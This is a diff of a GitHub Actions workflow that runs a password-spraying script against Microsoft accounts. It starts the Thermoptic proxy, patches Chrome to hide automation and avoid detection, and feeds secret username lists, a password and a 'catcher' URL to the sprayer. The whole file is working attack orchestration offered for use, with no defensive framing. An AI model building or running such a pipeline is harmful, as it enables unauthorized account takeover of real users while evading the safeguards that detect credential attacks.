@@ -1,50 +1,57 @@
-name: Sprayer 
- 
+name: Sprayer
+
 on:
   workflow_dispatch:
 
 jobs:
-  build:
+  spray:
     runs-on: ubuntu-latest
-    
+    timeout-minutes: 15
+
     steps:
-      - uses: actions/checkout@v2
-      
+      - uses: actions/checkout@v4
+
       - name: Set up Python
-        uses: actions/setup-python@v2
+        uses: actions/setup-python@v5
         with:
-          python-version: '3.x'
-      
+          python-version: "3.12"
+          cache: "pip"
+          cache-dependency-path: sprayer/requirements.txt
+
       - name: Install dependencies
-        run: python3 -m pip install -r sprayer/requirements.txt
-      
-      - name: Clone and Start Thermoptic Proxy
+        run: pip install -r sprayer/requirements.txt
+
+      - name: Start Thermoptic proxy
         run: |
-          echo "[*] Clonando Thermoptic..."
-          git clone https://github.com/mandatoryprogrammer/thermoptic.git
+          git clone --depth 1 https://github.com/mandatoryprogrammer/thermoptic.git
           cd thermoptic
+
+          # Anti-detection patches
           sed -i '/CHROME_COMMON_FLAGS=(/a\  --disable-blink-features=AutomationControlled' chrome/start.sh
           sed -i '/CHROME_COMMON_FLAGS=(/a\  --window-size=1920,1080' chrome/start.sh
-          echo "[*] Iniciando proxy via Docker Compose..."
+
           docker compose up --build -d
-          
-          echo "[+] Proxy Thermoptic iniciado"
-          docker compose ps
-          sleep 5
-      
-      - name: Run Sprayer
-        run: python3 sprayer/sprayer-microsoft.py
+          echo "[+] Thermoptic proxy started"
+
+          # Wait for proxy to be ready
+          for i in $(seq 1 30); do
+            if curl -x http://changeme:changeme@127.0.0.1:1234 -sk https://httpbin.org/ip > /dev/null 2>&1; then
+              echo "[+] Proxy ready after ${i}s"
+              break
+            fi
+            sleep 1
+          done
+
+      - name: Run sprayer
+        run: python sprayer/sprayer-microsoft.py
         env:
           USERNAMES: ${{ secrets.USERNAMES }}
           PASSWORD: ${{ secrets.PASSWORD }}
           CATCHERURL: ${{ secrets.CATCHERURL }}
           CATCHERTLS: ${{ secrets.CATCHERTLS }}
           INSTANCE_ID: ${{ github.run_id }}
-      
-      - name: Stop Thermoptic Proxy
+
+      - name: Stop Thermoptic
         if: always()
         run: |
-          cd thermoptic
-          echo "[*] Parando proxy Thermoptic..."
-          docker compose down
-          echo "[+] Proxy parado"
+          cd thermoptic && docker compose down 2>/dev/null || true
